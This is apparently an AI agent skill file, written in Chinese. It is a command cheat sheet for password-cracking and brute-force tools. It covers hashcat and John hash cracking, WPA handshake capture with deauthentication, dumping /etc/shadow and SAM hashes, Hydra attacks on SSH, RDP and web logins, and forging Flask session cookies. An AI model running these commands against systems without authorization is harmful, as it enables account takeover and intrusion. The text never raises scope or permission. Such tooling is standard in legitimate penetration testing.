---
name: password-cracking
description: 密码爆破工具链 — hashcat, John, Hydra, Medusa, CeWL, crunch
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [password, cracking, hashcat, john, brute-force, dictionary, hash, wifi, network]
---

# 密码爆破工具链

## 核心工具一览

| 工具 | 用途 | 特点 |
|------|------|------|
| **hashcat** | GPU密码破解 | 最快，400+哈希类型 |
| **John the Ripper** | CPU密码破解 | 格式最多 |
| **Hydra** | 网络协议爆破 | SSH/FTP/HTTP/RDP等 |
| **Medusa** | 网络协议爆破 | 并发更高 |
| **Ncrack** | 网络认证爆破 | Nmap团队出品 |
| **CeWL** | 自定义字典生成 | 爬取网站生成词典 |
| **crunch** | 暴力字典生成 | 按规则生成组合 |
| **maskprocessor** | 掩码字典生成 | hashcat配套 |
| **RainbowCrack** | 彩虹表破解 | 时间换空间 |
| **hashid** | 哈希类型识别 | 自动判断格式 |
| **nth** | 哈希类型识别 | 更智能的识别器 |

---

## 1. hashcat — GPU破解之王

### 安装
```bash
sudo apt install hashcat  # 可能较旧，建议源码编译
# 源码编译 (推荐，获取v7.1.2+)
git clone https://github.com/hashcat/hashcat.git
cd hashcat && make -j$(nproc) && sudo make install
# v7.x新增: Rust Bridge插件支持、Docker (AMD HIP/OpenCL)
```

### 哈希模式速查
```
0       MD5
100     SHA1
1000    NTLM
1400    SHA256
1700    SHA512
3000    LM
3200    bcrypt ($2*)
2500    WPA/WPA2
22000   WPA-PBKDF2-PMKID+EAPOL
5600    NetNTLMv2
13100   Kerberos 5 TGS-REP
18200   Kerberos 5 AS-REP
10      md5($pass.$salt)
20      md5($salt.$pass)
1410    sha256($pass.$salt)
1710    sha512($salt.$pass)

# v7.1新增模式
34200   KeePass4 (KDBX4)
sm3crypt / $sm3$   SM3 (Unix/中国国密)
94200   BLAKE2b-256
28100   Windows Hello PIN/Password
9600    MS Office 2013
```

### 攻击模式
```bash
# 字典攻击
hashcat -m 0 -a 0 hash.txt wordlist.txt

# 掩码暴力(8位小写字母+数字)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# 组合攻击
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# 规则攻击
hashcat -m 0 -a 0 -r rules/best64.rule hash.txt wordlist.txt

# 增量掩码(所有可打印6位)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# 恢复中断
hashcat --session=my --restore
```

### 掩码字符集
```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = 特殊符号
?a = ?l?u?d?s
?b = 0x00-0xff
```

### WPA/WPA2破解
```bash
# 1. 抓握手包
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon

# 2. 破解
hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt
```

### NTLM/NetNTLM
```bash
hashcat -m 1000 -a 0 ntlm_hash.txt wordlist.txt
hashcat -m 5600 -a 0 netntlmv2.txt wordlist.txt
```

### 实用技巧
```bash
hashcat -m 0 hash.txt wordlist.txt --show           # 显示已破解
hashcat -m 0 hash.txt wordlist.txt -o cracked.txt    # 输出文件
hashcat -m 0 hash.txt wordlist.txt --status           # 进度
hashcat -m 0 hash.txt wordlist.txt --hwmon-temp-abort=90  # 温控
```

---

## 2. John the Ripper — 格式之王

### 安装
```bash
sudo apt install john
# 社区增强版(推荐)
git clone https://github.com/openwall/john.git -b bleeding-jumbo
cd john/src && ./configure && make -s clean && make -sj4
```

### 基本用法
```bash
john hash.txt                           # 自动识别
john --format=md5 hash.txt              # 指定格式
john --wordlist=rockyou.txt hash.txt    # 字典
john --wordlist=rockyou.txt --rules hash.txt  # 规则
john --incremental hash.txt             # 暴力
john --show hash.txt                    # 查看已破解
john --list=formats | grep -i md5       # 列出格式
```

### 常用格式
```
md5crypt / sha512crypt / bcrypt / nt / lm
raw-md5 / raw-sha256 / raw-sha512
mssql / oracle11 / wpa
```

### 破解Linux密码
```bash
sudo unshadow /etc/passwd /etc/shadow > linux_hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt linux_hashes.txt
```

### 破解Windows密码
```bash
secretsdump.py LOCAL -sam SAM -system SYSTEM
john --format=nt ntlm_hashes.txt
```

---

## 3. Hydra — 网络协议爆破

### 安装
```bash
sudo apt install hydra  # 建议v9.7+，可从源码编译
# 源码安装 (推荐最新v9.7):
sudo apt install -y git build-essential libssl-dev libssh-dev libidn11-dev libpcre3-dev libmysqlclient-dev libpq-dev
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra && ./configure && make -j$(nproc) && sudo make install
```

### 基本用法
```bash
# SSH
hydra -l admin -P passwords.txt ssh://192.168.1.100

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# HTTP POST表单
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Login Failed"

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# MySQL
hydra -l root -P passwords.txt 192.168.1.100 mysql

# 多目标
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# 并发控制
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# 恢复
hydra -R
```

### HTTP表单模板
```bash
# POST (失败标志)
hydra -l admin -P passwords.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# POST JSON
hydra -l admin -P passwords.txt target http-post-form \
  '/api/login:{"username":"^USER^","password":"^PASS^"}:F=401'

# 带Cookie
hydra -l admin -P passwords.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:H=Cookie: session=abc:F=Failed"
```

---

## 4. 字典生成工具

### CeWL — 网站爬取
```bash
sudo apt install cewl
cewl https://target.com -d 2 -m 5 -w wordlist.txt
cewl https://target.com -d 2 -m 5 -e --email_file emails.txt
```

### crunch — 暴力字典
```bash
sudo apt install crunch

crunch 8 8 0123456789 -o digits.txt           # 8位数字
crunch 6 8 abcdefghijklmnopqrstuvwxyz -o alpha.txt  # 6-8位字母
crunch 10 10 -t @@@@%%%%%% -o pattern.txt     # 模式
# @ = 小写字母, , = 大写字母, % = 数字, ^ = 特殊字符
```

### maskprocessor
```bash
git clone https://hashcat.net/maskprocessor/
cd maskprocessor/src && make
./mp64 ?d?d?d?d?d?d?d?d > digits.txt
./mp64 -1 ?l?d ?1?1?1?1?1?1   # 6位小写+数字
```

---

## 5. 哈希识别

```bash
pip install hashid name-that-hash

hashid '$2a$10$...'
hashid '5f4dcc3b5aa765d61d8327deb882cf99'

nth -t '$2a$10$...'    # 识别并推荐hashcat/john模式
```

---

## 6. 破解流程

```
1. 识别hash类型 (hashid / nth)
2. 选择工具 (hashcat GPU优先)
3. 字典攻击 (rockyou.txt + 规则)
4. 掩码暴力 (?d?d?d?d?d?d 6位数字)
5. 组合攻击 (字典1 x 字典2)
6. 纯暴力 (最后手段)
```

### 常用字典
```bash
/usr/share/wordlists/rockyou.txt.gz
# SecLists
SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
SecLists/Passwords/Common-Credentials/best1050.txt
SecLists/Usernames/top-usernames-shortlist.txt
```

### 常用规则
```bash
# hashcat
rules/best64.rule
rules/toggles1.rule
rules/d3ad0ne.rule
rules/dive.rule

# John
--rules=best64
--rules=jumbo
```

---

## 7. 高级技巧

### 掩码组合
```bash
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?d?d?d?d  # 前4字母后4数字
hashcat -m 0 -a 3 hash.txt 'P@ss?d?d?d'       # 已知部分
hashcat -m 0 -a 3 -1 ?l?u -2 ?l?d hash.txt ?1?2?2?2?2?2  # 自定义字符集
```

### 分布式破解
```bash
split -l 1000 hash.txt hash_part_
# 不同机器跑不同部分
cat hash_part_*.potfile | sort -u > all_cracked.txt
```

---

## Pitfalls

1. **hashcat模式选错** — 用hashid/nth先识别
2. **字典太小** — rockyou.txt是起点不是终点
3. **不用规则** — 规则放大字典效果10-100倍
4. **GPU过热** — 加 --hwmon-temp-abort=90
5. **忘记--show** — 跑完不看结果白跑
6. **Hydra被ban** — 加 -t 4 限速
7. **hashcat不能用sudo** — GPU驱动权限用普通用户
8. **WPA握手包不完整** — 确保四次握手完整
9. **bcrypt极慢** — 正常设计

---

## 8. 新增工具

### BruteSpray — Nmap结果自动爆破
```bash
pip install brutespray
# 自动解析Nmap/Nessus输出，对发现的服务进行凭证爆破
brutespray -f nmap.xml -U users.txt -P passwords.txt
brutespray -f nmap.gnmap --threads 5
```

### Flask-Unsign — Flask密钥破解
```bash
pip install flask-unsign
# 爆破Flask secret key / 伪造session cookie
flask-unsign --unsign --cookie 'session_cookie_here'
flask-unsign --wordlist wordlist.txt --unsign --cookie 'session_cookie_here'
flask-unsign --sign --cookie '{"user":"admin"}' --secret 'discovered_key'
```
